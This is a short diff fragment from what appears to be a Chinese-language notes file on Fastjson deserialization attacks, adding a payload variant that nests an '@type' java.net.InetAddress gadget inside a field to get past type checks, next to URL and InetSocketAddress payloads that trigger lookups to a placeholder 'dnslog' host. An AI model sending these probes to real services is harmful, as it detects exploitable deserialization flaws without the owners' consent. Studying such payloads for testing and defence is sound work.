@@ -83,8 +83,10 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
 {{"@type":"java.net.URL","val":"http://dnslog"}:0
 ```
-
-
+为了避免传入的参数是规定的类型
+```
+{"xxx": {"@type":"java.net.InetAddress","val":"dnslog"}}
+```
 
 ## 各版本利用
 
